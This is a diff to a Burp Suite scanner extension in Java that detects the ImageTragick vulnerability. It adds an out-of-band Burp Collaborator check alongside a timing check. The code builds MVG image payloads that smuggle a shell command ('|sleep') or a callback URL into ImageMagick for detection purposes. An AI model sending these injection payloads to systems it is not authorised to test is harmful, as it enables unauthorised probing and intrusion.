@@ -1,5 +1,6 @@
 package burp;
 
+import java.net.URL;
 import java.util.*;
 
 public class BurpExtender implements IBurpExtender, IScannerCheck
@@ -54,10 +55,13 @@ public class BurpExtender implements IBurpExtender, IScannerCheck
 	final static byte IMAGETRAGICK_SLEEP_SEC = 5;
 	private final static long IMAGETRAGICK_SLEEP_NS = IMAGETRAGICK_SLEEP_SEC * 1000000000L;
 	private final static long IMAGETRAGICK_TRESHOLD_NS = 1000000000L;
+	private final static String IMAGETRAGICK_HEAD =
+		"push graphic-context\nviewbox 0 0 640 480\nfill 'url(";
+	private final static String IMAGETRAGICK_TAIL = ")'\npop graphic-context\n";
 	private final static byte[] IMAGETRAGICK_PAYLOAD = (
-			"push graphic-context\nviewbox 0 0 640 480\n" +
-			"fill 'url(https://127.0.0.0/oops.jpg\"|sleep \"" + IMAGETRAGICK_SLEEP_SEC + ")'\n" +
-			"pop graphic-context\n").getBytes();
+			IMAGETRAGICK_HEAD + "https://127.0.0.0/oops.jpg\"|sleep \"" +
+			IMAGETRAGICK_SLEEP_SEC + IMAGETRAGICK_TAIL
+			).getBytes();
 
 	@Override
 	public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse,
@@ -66,17 +70,32 @@ public class BurpExtender implements IBurpExtender, IScannerCheck
 		int[] d = SimpleImageSizeReader.getImageSize(baseValue, 0, baseValue.length);
 		if (d == null) return null;
 		final IHttpService hs = baseRequestResponse.getHttpService();
+		IBurpCollaboratorClientContext ccc = callbacks.createBurpCollaboratorClientContext();
+		String host = ccc.generatePayload(true);
+		IHttpRequestResponse response = callbacks.makeHttpRequest(hs,
+				insertionPoint.buildRequest((IMAGETRAGICK_HEAD + "http://" +
+						host + "/a.jpg" + IMAGETRAGICK_TAIL).getBytes()));
+		List<IBurpCollaboratorInteraction> events = ccc.fetchCollaboratorInteractionsFor(host);
+		if (!events.isEmpty()) {
+			return ImageTragickIssue.reportOnCollaborator(response,
+					hrrToUrl(baseRequestResponse),
+					insertionPoint.getInsertionPointName(), host, events);
+		}
 		long baseTime = measureRequest(hs, baseRequestResponse.getRequest()).getKey();
 		Map.Entry<Long, IHttpRequestResponse> sleepMeasurement =
 			measureRequest(hs, insertionPoint.buildRequest(IMAGETRAGICK_PAYLOAD));
 		long sleepTime = sleepMeasurement.getKey();
 		if (Math.abs(sleepTime - baseTime - IMAGETRAGICK_SLEEP_NS)
 				> IMAGETRAGICK_TRESHOLD_NS) return null;
+		return ImageTragickIssue.reportOnTiming(
+					sleepMeasurement.getValue(), hrrToUrl(baseRequestResponse),
+					insertionPoint.getInsertionPointName(), baseTime, sleepTime);
+	}
+
+	private URL hrrToUrl(IHttpRequestResponse baseRequestResponse) {
 		IRequestInfo ri = helpers.analyzeRequest(baseRequestResponse.getHttpService(),
 				baseRequestResponse.getRequest());
-		return Collections.singletonList((IScanIssue)new ImageTragickIssue(
-					sleepMeasurement.getValue(), ri.getUrl(),
-					insertionPoint.getInsertionPointName(), baseTime, sleepTime));
+		return ri.getUrl();
 	}
 
 	private Map.Entry<Long, IHttpRequestResponse> measureRequest(IHttpService httpService, byte[] request) {
